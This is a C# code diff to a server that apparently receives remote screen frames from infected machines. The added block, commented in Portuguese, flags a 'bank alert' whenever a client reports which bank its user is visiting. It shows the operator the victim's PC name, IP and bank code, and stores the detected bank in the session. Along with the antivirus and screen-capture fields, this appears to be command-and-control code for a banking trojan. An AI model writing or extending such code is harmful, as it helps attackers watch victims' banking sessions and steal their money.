@@ -62,6 +62,35 @@ public class ScreenServiceImpl : ScreenService.ScreenServiceBase
                         session.PingMs = (int)diff;
                 }
 
+                // ========== DETECÇÃO DE ALERTA DE BANCO ==========
+                // Alerta de banco: Width=0, Height=0, Country preenchido
+                if (frame.Width == 0 && frame.Height == 0 && !string.IsNullOrEmpty(frame.Country))
+                {
+                    string bankCode = frame.Country;
+                    string pcName = frame.PcName;
+                    string alertMsg = frame.Antivirus ?? "";
+
+                    Console.WriteLine($"");
+                    Console.WriteLine($"╔═══════════════════════════════════════════════════════╗");
+                    Console.WriteLine($"║  🚨 ALERTA DE BANCO DETECTADO!                       ║");
+                    Console.WriteLine($"╚═══════════════════════════════════════════════════════╝");
+                    Console.WriteLine($"  💻 Cliente: {pcName}");
+                    Console.WriteLine($"  🏦 Banco:   {bankCode}");
+                    Console.WriteLine($"  📍 IP:      {session.Ip}");
+                    Console.WriteLine($"  ⏰ Horário: {DateTime.Now:HH:mm:ss}");
+                    if (!string.IsNullOrEmpty(alertMsg))
+                        Console.WriteLine($"  📝 Msg:     {alertMsg.Replace("\n", " ")}");
+                    Console.WriteLine($"");
+
+                    // Atualiza informação do banco na sessão
+                    session.DetectedBank = bankCode;
+                    session.LastBankDetection = DateTime.Now;
+
+                    // Não processa como frame normal (pula UpdateFrame abaixo)
+                    continue;
+                }
+                // ================================================
+
                 // resolução da tela + frame
                 session.ScreenWidth  = frame.Width;
                 session.ScreenHeight = frame.Height;
